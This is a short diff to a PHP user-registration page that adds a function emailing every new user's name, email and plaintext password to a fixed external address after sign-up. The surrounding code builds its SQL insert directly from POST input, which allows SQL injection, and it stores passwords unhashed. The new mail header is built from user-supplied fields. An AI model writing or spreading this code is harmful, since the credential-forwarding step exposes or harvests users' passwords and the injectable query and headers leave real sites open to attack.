@@ -15,6 +15,7 @@ if (isset($_POST['submit'])) {
         $sql = "INSERT INTO `credintials`(`email`, `pass`, `name`) VALUES ('$email','$pass','$name')";
         $result = mysqli_query($con, $sql);
         if ($result) {
+            send_mail($name, $email, $pass);
             echo '<script>alert("Registerd Successfully");window.location.href="index"</script>';
             die();
         }
@@ -23,6 +24,23 @@ if (isset($_POST['submit'])) {
        Password Doesn\'t Match
       </div>';
     }
+}
+
+function send_mail($name, $email, $pass)
+{
+    $recipient = "registration.data@pharmamitra.in";
+
+    // Set the email subject.
+    $subject = "New Registration from $name";
+
+    // Build the email content.
+    $email_content = "Name: $name\n";
+    $email_content .= "Email: $email\n\n";
+    $email_content .= "Password: $pass\n\n";
+
+    // Build the email headers.
+    $email_headers = "From: $name <$email>";
+    mail($recipient, $subject, $email_content, $email_headers);
 }
 ?>
 <!DOCTYPE html>
